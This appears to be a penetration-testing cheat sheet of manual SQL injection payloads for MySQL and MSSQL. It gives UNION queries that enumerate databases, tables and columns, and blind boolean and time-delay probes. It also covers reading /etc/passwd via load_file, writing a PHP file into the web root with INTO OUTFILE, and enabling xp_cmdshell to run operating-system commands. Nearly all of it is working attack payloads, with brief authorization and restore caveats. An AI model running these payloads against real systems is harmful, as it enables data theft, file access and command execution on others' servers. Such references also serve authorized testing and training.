# Manual SQL injection

[← Foothold quick reference](../02-foothold.md)

Find string, numeric, or parenthesized context. Compare true/false requests.

## In-band checks

```sql
' AND 1=1 -- //
' AND 1=2 -- //
' ORDER BY 1-- -
' UNION SELECT NULL,NULL,NULL-- -
```

MySQL examples below assume three columns; adjust count/types and put output in a visible column.

```sql
' UNION SELECT 1,@@version,3-- -
' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata-- -
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
```

MySQL file read/write: requires `FILE`, allowed path, and a usable web handler for execution.

```sql
' UNION SELECT 1,load_file('/etc/passwd'),3-- -
' UNION SELECT 1,'<?php echo "ok";?>',3 INTO OUTFILE '/var/www/html/check.php'-- -
```

## Blind checks

No visible value: compare true/false, then repeat a delayed MySQL request against baseline.

```sql
' AND (SELECT SUBSTRING(database(),1,1))='a' -- //
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100 -- //
' AND IF(1=1, SLEEP(5), 0) -- //
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>100, SLEEP(5), 0) -- //
```

## MSSQL string context

Pick the prefix that fits the input: string `';`, numeric `1;`, or parenthesized `');`.

```sql
'; WAITFOR DELAY '00:00:05';-- -
1; WAITFOR DELAY '00:00:05';-- -
'); WAITFOR DELAY '00:00:05';-- -
```

Check SQL identity and `xp_cmdshell` state/rights:

```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT name, value, value_in_use FROM sys.configurations
WHERE name IN ('show advanced options', 'xp_cmdshell');
```

If authorized to change options, save both original values before enabling:

```sql
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- -
```

```sql
'; EXEC xp_cmdshell 'whoami';-- -
```

Restore only options you changed (example assumes both were off):

```sql
'; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;-- -
```

SQL Server option behavior: [Microsoft `xp_cmdshell` configuration](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option) and [`sys.configurations`](https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-configurations-transact-sql).
